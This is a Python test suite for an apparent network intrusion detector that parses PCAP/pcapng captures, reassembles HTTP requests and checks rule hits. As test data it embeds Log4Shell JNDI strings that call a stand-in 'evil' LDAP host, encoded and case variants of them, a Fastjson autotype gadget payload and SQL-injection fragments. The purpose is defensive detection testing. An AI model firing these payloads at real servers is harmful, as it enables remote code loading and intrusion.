"""流量检测层测试（v1.2）：PCAP 解析 → TCP 重组 → HTTP 还原 → 规则命中。

测试设计的两个原则（与项目其它测试一致）：
1. **真阳性**：已知攻击必须命中，且是"原始字节没写错"的命中。
2. **真阴性**：正常请求一条都不许报——检测器的误报和漏报同样致命。

另外覆盖三类"只有真实抓包才会暴露"的坑：
- 乱序分段（载荷被拆包，先到的可能是后半段）
- 编码/大小写变形（`%24%7Bjndi`、`${JNDI:`）
- 非 HTTP 流量与服务端响应（不应产生事件）
"""
from datetime import datetime

import pytest

from collectors.pcap import (PcapError, _iter_records, _judgement_text,
                             iter_events, normalize, parse_file)
from engine.detector import load_rules_dir, run_rules
from models import HttpEvent
from storage import Storage
from tools.pcapgen import (demo_records, http_request, http_response, pcap_bytes,
                           pcapng_bytes, tcp_frame, udp_frame)

from pathlib import Path

DEMO = Path(__file__).parent / "fixtures" / "traffic_demo.pcap"
RULES = Path(__file__).parent.parent / "rules"


def _detect(events):
    return run_rules(events, load_rules_dir(RULES))


def _write(tmp_path, records, name="x.pcap", **kw):
    p = tmp_path / name
    p.write_bytes(pcap_bytes(records, **kw))
    return p


# ---------- 1. 解析层：演示 PCAP ----------

def test_demo_pcap_extracts_five_requests():
    events = parse_file(DEMO)
    assert len(events) == 5
    assert [e.method for e in events] == ["GET", "POST", "GET", "POST", "POST"]
    assert events[2].uri == "/?x=1"
    assert events[3].uri == "/api/parse"


def test_server_response_and_udp_ignored():
    """服务端响应与 DNS 噪音都不应成为事件。"""
    events = parse_file(DEMO)
    assert all(e.ip != "10.0.0.80" for e in events)   # 没有响应方向的"事件"
    assert all(e.method for e in events)              # 每条都是合法请求方法
    assert len(events) == 5                           # 8 个包里只有 5 个请求


def test_out_of_order_segments_are_reassembled():
    """Fastjson 的 body 被拆成两段且乱序到达，重组后必须完整。"""
    events = parse_file(DEMO)
    fastjson = next(e for e in events if e.uri == "/api/parse")
    assert '"@type":"com.sun.rowset.JdbcRowSetImpl"' in fastjson.body
    assert fastjson.body.rstrip().endswith("}")


# ---------- 2. 检测层：真阳性 ----------

def test_three_rules_hit_on_demo_traffic():
    alerts = _detect(parse_file(DEMO))
    assert len(alerts) == 3
    assert {a.rule_id for a in alerts} == {
        "http-log4shell-jndi", "http-fastjson-autotype", "http-webshell-body-markers"}
    assert all(a.severity == "critical" for a in alerts)
    assert {a.source_ip for a in alerts} == {"10.0.0.66", "10.0.0.77", "10.0.0.88"}
    # 告警里要能定位到具体请求（分析师研判入口）
    assert "/api/parse" in next(a for a in alerts
                                if a.rule_id == "http-fastjson-autotype").detail


def test_url_encoded_payload_is_caught(tmp_path):
    """`%24%7Bjndi%3A` 这类 URL 编码：只匹配原文必然漏，归一化后才能命中。"""
    payload = http_request(
        "GET", "/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D", "shop.internal")
    pcap = _write(tmp_path, [(1793797200.0, tcp_frame(
        "10.0.0.5", "10.0.0.80", 40000, 80, 1000, payload))])
    alerts = _detect(parse_file(pcap))
    assert [a.rule_id for a in alerts] == ["http-log4shell-jndi"]


def test_case_variant_payload_is_caught(tmp_path):
    """`${JNDI:` 大写变形：归一化视图转小写后命中，raw 仍保留原样。"""
    payload = http_request("GET", "/?q=${JNDI:ldap://evil/a}", "shop.internal")
    pcap = _write(tmp_path, [(1793797200.0, tcp_frame(
        "10.0.0.6", "10.0.0.80", 40001, 80, 2000, payload))])
    events = parse_file(pcap)
    assert [a.rule_id for a in _detect(events)] == ["http-log4shell-jndi"]
    assert "${JNDI:" in events[0].raw                  # 证据未被改写
    assert "${jndi:" in events[0].normalized


# ---------- 3. 检测层：真阴性 ----------

def test_benign_traffic_produces_no_alert(tmp_path):
    records = [
        (1793797200.0, tcp_frame("10.0.0.12", "10.0.0.80", 50000, 80, 100,
                                 http_request("GET", "/api/orders?page=2",
                                              "shop.internal"))),
        (1793797200.5, tcp_frame("10.0.0.12", "10.0.0.80", 50001, 80, 200,
                                 http_request("POST", "/api/login", "shop.internal",
                                              body=b'{"user":"alice"}'))),
    ]
    pcap = _write(tmp_path, records)
    assert _detect(parse_file(pcap)) == []


def test_keepalive_two_requests_in_one_flow(tmp_path):
    """同一条连接上的两个请求都要被切出来（HTTP/1.1 keep-alive）。"""
    first = http_request("GET", "/a", "shop.internal")
    second = http_request("GET", "/b", "shop.internal")
    pcap = _write(tmp_path, [(1793797200.0, tcp_frame(
        "10.0.0.9", "10.0.0.80", 40010, 80, 9000, first + second))])
    events = parse_file(pcap)
    assert [e.uri for e in events] == ["/a", "/b"]


# ---------- 1.5 流式解析（v1.4：为 GB 级公开数据集补的） ----------

def test_iter_events_matches_parse_file():
    """流式与全量两条路径必须产出同一个事件集（否则基准测试的数不可信）。"""
    full = parse_file(DEMO)
    streamed = sorted(iter_events(DEMO), key=lambda e: e.ts)
    assert len(full) == len(streamed) == 5
    assert [e.raw for e in full] == [e.raw for e in streamed]


def test_iter_events_keeps_all_requests_in_keepalive_flow(tmp_path):
    """流式模式**不许**丢 keep-alive 流里的请求（易错点：只取最后一条）。"""
    first = http_request("GET", "/a", "shop.internal")
    second = http_request("GET", "/b", "shop.internal")
    third = http_request("GET", "/c", "shop.internal")
    pcap = _write(tmp_path, [(1793797200.0, tcp_frame(
        "10.0.0.9", "10.0.0.80", 40011, 80, 9100, first + second + third))])
    events = sorted(iter_events(pcap), key=lambda e: e.ts)
    assert [e.uri for e in events] == ["/a", "/b", "/c"]


def test_iter_events_releases_idle_flows(tmp_path):
    """空闲超过阈值的流应当被回收产出，而不是一直堆在内存里。

    构造两条相隔很远（> idle 阈值）的流：idle_seconds 设小值时，
    第一条流应当在处理第二条流的过程中就被 drain 出来。
    """
    a = http_request("GET", "/early", "shop.internal")
    b = http_request("GET", "/late", "shop.internal")
    pcap = _write(tmp_path, [
        (1793797200.0, tcp_frame("10.0.0.9", "10.0.0.80", 40012, 80, 9200, a)),
        (1793797500.0, tcp_frame("10.0.0.9", "10.0.0.81", 40013, 80, 9300, b)),
    ])
    events = list(iter_events(pcap, idle_seconds=1.0))
    assert sorted(e.uri for e in events) == ["/early", "/late"]


def test_iter_records_rejects_absurd_frame_length(tmp_path):
    """文件损坏导致 incl_len 是垃圾值时，必须报错而不是尝试分配几 GB。"""
    good = pcap_bytes([(1793797200.0, tcp_frame(
        "10.0.0.9", "10.0.0.80", 40014, 80, 9400,
        http_request("GET", "/x", "shop.internal")))])
    # 把第一条记录的 incl_len（记录头偏移 24+8 处，4 字节小端）改成极大值
    corrupt = bytearray(good)
    corrupt[24 + 8:24 + 12] = (0x7FFFFFFF).to_bytes(4, "little")
    p = tmp_path / "bad.pcap"
    p.write_bytes(bytes(corrupt))
    with pytest.raises(PcapError):
        list(iter_events(p))


def test_normalize_handles_double_encoding():
    """二次编码也能解到不动点（攻击者常用双重 URL 编码绕 WAF）。"""
    assert normalize("%2524%257Bjndi%253A") == "${jndi:"


# ---------- 3b. form 编码的 `+`（v1.9） ----------

def test_judgement_text_decodes_form_plus_in_query():
    """query 里的 `+` 就是空格，不还原的话 `union select` 类的判据全部落空。"""
    txt = _judgement_text(
        "GET /p?id=1+UNION+SELECT+pw HTTP/1.1", "host: x", "",
        {"host": "x"},
    )
    assert "1 union select pw" in normalize(txt)


def test_judgement_text_decodes_form_plus_in_form_body_only():
    """只对 form-urlencoded 的 body 换 `+`：JSON / multipart 里的 `+` 是字面量。

    这一条是防误报的：把 JSON body 里的 `+` 也换成空格，等于给所有加号
    运算场景凭空造出一个空格，规则可能因此误命中，也可能因此漏命中。
    """
    form = _judgement_text("POST /p HTTP/1.1", "content-type: "
                           "application/x-www-form-urlencoded", "a=1+and+2=2",
                           {"content-type": "application/x-www-form-urlencoded"})
    assert "a=1 and 2=2" in normalize(form)

    js = _judgement_text("POST /p HTTP/1.1", "content-type: application/json",
                         '{"q":"1+and+2"}', {"content-type": "application/json"})
    assert "1+and+2" in normalize(js), "JSON body 里的 + 必须原样保留"


def test_judgement_text_leaves_path_plus_alone():
    """path 段的 `+` 是字面字符（`/a+b` 不等于 `/a b`）。"""
    txt = _judgement_text("GET /a+b/c?q=1+2 HTTP/1.1", "", "", {})
    assert "/a+b/c" in txt
    assert "q=1 2" in txt


def test_raw_is_never_rewritten_by_plus_decoding(tmp_path):
    """判据可以归一化，证据不能——`raw` 必须还是原样的 `+`。"""
    pcap = _write(tmp_path, [(1793797200.0, tcp_frame(
        "10.0.0.7", "10.0.0.80", 40002, 80, 3000,
        http_request("GET", "/p?id=1+UNION+SELECT+pw", "shop.internal")))])
    ev = parse_file(pcap)[0]
    assert "+" in ev.raw, "证据必须保留原始 +"
    assert "union select" in ev.normalized, "判据视图里应已还原成空格"


# ---------- 4. 格式健壮性 ----------

@pytest.mark.parametrize("endian,nano", [(">", False), ("<", False), ("<", True)])
def test_endianness_and_timestamp_precision(tmp_path, endian, nano):
    pcap = _write(tmp_path, [(1793797200.5, tcp_frame(
        "10.0.0.7", "10.0.0.80", 40002, 80, 3000,
        http_request("GET", "/x", "shop.internal")))], endian=endian, nano=nano)
    events = parse_file(pcap)
    assert len(events) == 1
    assert events[0].ts >= datetime(2026, 11, 4)


def test_truncated_file_keeps_earlier_packets(tmp_path):
    """抓包被 kill -9 截断是常态：最后半个包丢弃，之前的包照常解析。

    单个包被截断时不能"尽力解析"——半个帧的 TCP payload 拼进去只会
    制造错误的请求，宁可丢掉这一个包。
    """
    records = [
        (1793797200.0, tcp_frame("10.0.0.8", "10.0.0.80", 40003, 80, 4000,
                                 http_request("GET", "/first", "shop.internal"))),
        (1793797201.0, tcp_frame("10.0.0.8", "10.0.0.80", 40004, 80, 5000,
                                 http_request("GET", "/second", "shop.internal"))),
    ]
    pcap = _write(tmp_path, records)
    truncated = tmp_path / "trunc.pcap"
    truncated.write_bytes(pcap.read_bytes()[:-20])
    events = parse_file(truncated)
    assert [e.uri for e in events] == ["/first"]


def test_unsupported_linktype_raises(tmp_path):
    pcap = _write(tmp_path, [(1793797200.0, b"\x00" * 40)], linktype=999)
    with pytest.raises(PcapError):
        parse_file(pcap)


def test_not_a_pcap_raises(tmp_path):
    bogus = tmp_path / "bogus.bin"
    bogus.write_bytes(b"not a pcap at all, just text padding here......")
    with pytest.raises(PcapError):
        parse_file(bogus)


# ---------- 4b. pcapng 容器（CIC-IDS2017 官方发的就是这个格式） ----------

def _write_ng(tmp_path, records, name="x.pcapng", **kw):
    p = tmp_path / name
    p.write_bytes(pcapng_bytes(records, **kw))
    return p


def test_pcapng_matches_pcap_output(tmp_path):
    """同一批包，pcap 与 pcapng 两种容器必须解析出完全相同的事件。

    这是"支持 pcapng"这件事的唯一验收标准：容器换了，检测结果不能变。
    """
    from_pcap = parse_file(_write(tmp_path, demo_records(), name="a.pcap"))
    from_ng = parse_file(_write_ng(tmp_path, demo_records(), name="a.pcapng"))
    assert [(e.ts, e.ip, e.method, e.uri) for e in from_pcap] == \
           [(e.ts, e.ip, e.method, e.uri) for e in from_ng]
    assert len(from_ng) == 5


@pytest.mark.parametrize("endian", ["<", ">"])
def test_pcapng_section_byte_order(tmp_path, endian):
    """Section Header 可以声明大端，文件其余部分跟着它走。"""
    p = _write_ng(tmp_path, demo_records(), endian=endian)
    events = parse_file(p)
    assert len(events) == 5
    assert events[0].ts >= datetime(2026, 11, 4)


@pytest.mark.parametrize("exp", [6, 9])
def test_pcapng_tsresol_is_honoured(tmp_path, exp):
    """时间精度来自接口选项 if_tsresol，不能一律按微秒算。

    微秒(10^-6)与纳秒(10^-9)写同一个 epoch，若把纳秒当微秒读，
    时间会偏 1000 倍——而症状只是"攻击窗对不上"，很容易误判成检测器坏了。

    断言打在**记录层**（`_iter_records`）而不是事件层：事件时间戳按设计
    截断到秒（存储层 timespec="seconds"，见 `_build_event`），那是有意为之，
    不是精度丢失。两条的职责要分开测。
    """
    ts = 1793797200.25
    p = _write_ng(tmp_path, [(ts, tcp_frame(
        "10.0.0.7", "10.0.0.80", 40100, 80, 9000,
        http_request("GET", "/ng", "shop.internal")))], tsresol_exp=exp)

    records = list(_iter_records(p))
    assert len(records) == 1
    delta = abs(records[0][0].timestamp() - ts)
    assert delta < 1e-4, f"记录时间戳偏差 {delta}s，if_tsresol 没被正确应用"


def test_pcapng_multiple_interfaces(tmp_path):
    """一个文件里可以有多个 Section，各自声明不同的链路类型。

    只记住"第一个接口"的实现，遇到 SLL + Ethernet 混抓（或两个导出的抓包
    文件直接拼起来）就会把后续包按错误的链路类型剥头——症状是静默少事件，
    不报错，比崩溃更难查。
    """
    eth_frame = tcp_frame("10.0.0.9", "10.0.0.80", 40200, 80, 10000,
                          http_request("GET", "/eth", "shop.internal"))
    raw_frame = tcp_frame("10.0.0.9", "10.0.0.80", 40201, 80, 11000,
                          http_request("GET", "/raw", "shop.internal"))[14:]
    # 第二个 Section 声明 linktype=101（Raw IP），所以帧要剥掉以太网头
    data = bytearray(pcapng_bytes([(1793797200.0, eth_frame)], linktype=1))
    data += pcapng_bytes([(1793797201.0, raw_frame)], linktype=101)
    p = tmp_path / "multi.pcapng"
    p.write_bytes(bytes(data))

    events = parse_file(p)
    assert [e.uri for e in events] == ["/eth", "/raw"]


def test_pcapng_truncated_block_stops_cleanly(tmp_path):
    """块被截断时丢弃该块，之前的包照常返回（与 pcap 的截断语义一致）。"""
    p = _write_ng(tmp_path, demo_records()[:2])
    cut = tmp_path / "cut.pcapng"
    cut.write_bytes(p.read_bytes()[:-30])
    events = parse_file(cut)
    assert isinstance(events, list)          # 不抛异常即可，允许 0~2 条


def test_pcapng_bad_section_header_raises(tmp_path):
    """首个块不是 SHB 就报错，别把随便什么二进制当流量解析。"""
    p = tmp_path / "bad.pcapng"
    p.write_bytes(b"\x0a\x0d\x0d\x0a" + b"\x00" * 40)
    with pytest.raises(PcapError):
        parse_file(p)


# ---------- 5. 与存储层/引擎的兼容性 ----------

def test_http_event_stores_like_log_event(tmp_path):
    """HttpEvent 与 AuthEvent 字段对齐 → 存储层零改动可用。"""
    events = parse_file(DEMO)
    db = Storage(tmp_path / "t.db")
    try:
        assert db.insert_events(events) == 5
        assert db.event_stats() == {"http_request": 5}
    finally:
        db.close()


def test_http_event_defaults():
    ev = HttpEvent(ts=datetime(2026, 11, 4, 21, 0, 0), ip="10.0.0.1")
    assert ev.event_type == "http_request" and ev.username is None
    assert ev.service == "http"
